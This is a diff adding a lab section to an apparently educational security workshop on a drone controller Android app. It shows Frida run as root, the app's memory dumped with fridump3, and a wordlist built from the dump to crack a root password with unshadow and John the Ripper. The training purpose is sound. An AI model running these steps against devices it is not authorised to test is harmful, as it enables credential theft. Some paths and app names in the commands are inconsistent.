@@ -220,3 +220,66 @@ Fill in this table as you discover items:
 2. Does the app enforce HTTPS? Does it validate server certificates?
 3. Could you inject a command to the drone by intercepting and modifying the app's network traffic?
 4. What would you recommend to the app developer to fix the most critical findings?
+
+
+## Dynamic Analysis of the Android Specta App
+---
+*Start the Specta App*
+* Connect Phone to Internet WiFi Hot Spot
+* Start Solex App
+    * Allow permissions
+    * You may need to reboot
+
+---
+## Start the Frida Server on the Android Device
+```bash
+# login to the Android device
+adb shell
+# elevate to super user
+su -
+# change directories
+cd /data/local/tmp
+# verify frida-server is present
+ls
+# start the frida-server
+./frida-server &
+# verify the server is running
+ps -ef | grep -i frida
+```
+
+---
+## Dump Memory from running Specta app to Laptop
+
+Start the Specta app on the Android device
+
+Then run the following commands
+
+```bash
+cd /home/kali/frida
+source frida_venv/bin/activate
+frida-ps -U | grep -i solex 
+# not the Process ID (PID)
+cd fridump3
+mkdir solex
+python3 fridump3.py -r -U 
+```
+---
+## Create a wordlist from the memory dump
+
+Save the file to the same directory we saved the passwd file earlier
+
+```bash
+cd solex
+sort -u strings.txt > solex-strings-uniq.txt
+cp solex-strings-uniq.txt /home/kali/workshop/apps/john
+```
+---
+## Brute force the root password crack
+
+```bash
+cd ~/workshops/apps/john
+unshadow passwd shadow > unshadow.txt
+john --wordlist=/home/kali/workshop/apps/frida/fridump3/solex/strings.uniq unshadow.txt
+```
+
+*Congratulations! You just brute forced the root password*
